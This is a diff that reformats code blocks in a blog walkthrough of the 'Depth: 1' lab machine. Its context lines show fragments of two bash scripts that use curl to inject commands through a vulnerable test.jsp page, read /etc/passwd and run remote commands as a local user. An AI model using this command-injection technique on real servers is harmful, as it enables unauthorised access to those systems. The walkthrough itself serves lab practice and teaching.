@@ -1,6 +1,6 @@
 ---
 layout: post
-last_modified_at: 2018-06-27 10:57:07 +0000
+last_modified_at: 2018-08-05 00:21:52 +0000
 title: "Depth: 1 Walkthrough"
 subtitle: "This is Deep…"
 category: Walkthrough
@@ -89,8 +89,8 @@ For some reason, the HTML table shows token two, three, four, eight, and beyond.
 
 I wrote `cat.sh` to extract and display the printable ASCII characters from the hexadecimal numbers.
 
-{% highlight bash linenos %}
-# cat cat.sh
+<div class="filename"><span>cat.sh</span></div>
+```bash
 #!/bin/bash
 
 _HOST=192.168.100.4
@@ -123,7 +123,7 @@ curl -s $_HOST:$_PORT/$_TEST?$_PATH=$CMD \
 | cut -d'|' -f2 \
 | tr -d '\n' \
 | tr '.' '\n'
-{% endhighlight %}
+```
 
 This is how `/etc/passwd` looks like—`tomcat8` and `bill`.
 
@@ -146,8 +146,7 @@ Notice that `bill` can `sudo` as `root`?
 
 This is how `test.jsp` looks like.
 
-{% highlight jsp linenos %}
-# ./cat.sh ./webapps/ROOT/test.jsp
+```
 <%@ page import="java.util.*,java.io.*,java.util.regex.*"%>
 ...
 <%
@@ -185,7 +184,7 @@ This is how `test.jsp` looks like.
 
     }
 %>
-{% endhighlight %}
+```
 
 I'm able to run `ps faux` and notice that `sshd` is running. `ufw`, a firewall, is also running based on what's in `/etc/ufw/ufw.conf`.
 
@@ -223,8 +222,8 @@ Holy smoke. I'm able to execute remote commands and overcome the output display 
 
 With this in mind, I wrote `cmd.sh`, a script that displays the proper output from the commands as if `bill` is the one executing in a shell.
 
-{% highlight bash linenos %}
-# cat cmd.sh
+<div class="filename"><span>cmd.sh</span></div>
+```bash
 #!/bin/bash
 
 _HOST=192.168.100.4
@@ -259,7 +258,7 @@ curl -s $_HOST:$_PORT/$_TEST?$_PATH=${CMD//XXX/%60} \
 | sed -e '4!d' -e 's/^<td>//' -e 's/<\/td>$//' \
 | tr ' ' '\n' \
 | base64 -d
-{% endhighlight %}
+```
 
 ### Kill Bill: Vol. 2
 
